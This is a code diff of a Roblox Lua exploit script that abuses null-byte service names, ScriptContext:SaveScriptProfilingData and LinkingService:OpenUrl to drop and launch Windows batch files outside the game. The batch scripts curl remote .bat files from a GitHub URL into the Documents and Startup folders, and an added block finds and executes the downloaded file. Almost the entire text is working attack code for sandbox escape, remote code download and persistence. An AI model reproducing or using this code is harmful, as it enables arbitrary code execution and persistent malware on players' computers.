@@ -1,9 +1,6 @@
 local LinkingService = game:GetService("LinkingService\0 meow meow meow")
 local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
 local scriptContent = [[@echo off
-local LinkingService = game:GetService("LinkingService\0 meow meow meow")
-local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
-local scriptContent = [[@echo off
 @echo off
 :: Определение пути к папке "Документы"
 set "docsPath=%USERPROFILE%\Documents"
@@ -14,14 +11,9 @@ curl -o "%docsPath%\batchUpdate.bat" https://raw.githubusercontent.com/goofyahh-
 :: Уведомление о завершении
 echo Файл batchUpdate.bat успешно сохранен в папку "Документы".
 pause
-
-]]
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
 LinkingService:OpenUrl(payload)
-]]
-local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
-LinkingService:OpenUrl(payload)
-task.wait(0)
+task.wait(2)
 local LinkingService = game:GetService("LinkingService\0 meow meow meow")
 local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
 local scriptContent = [[@echo off
@@ -35,6 +27,27 @@ curl -o "%startupPath%\Auto.bat" https://raw.githubusercontent.com/goofyahh-hub/
 :: Уведомление о завершении
 echo Файл Auto.bat успешно сохранён в папку автозагрузки.
 pause
+
+]]
+local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
+LinkingService:OpenUrl(payload)
+task.wait(1)
+local LinkingService = game:GetService("LinkingService\0 meow meow meow")
+local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
+local scriptContent = [[@echo off
+@echo off
+setlocal enabledelayedexpansion
+
+set "searchFile=batchUpdate"
+set "documentsPath=%UserProfile%\Documents"
+
+for /r "%documentsPath%" %%F in ("%searchFile%*") do (
+    echo Найден файл: %%F
+    start "" "%%F"
+    exit /b
+)
+
+echo Файл не найден
 
 ]]
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
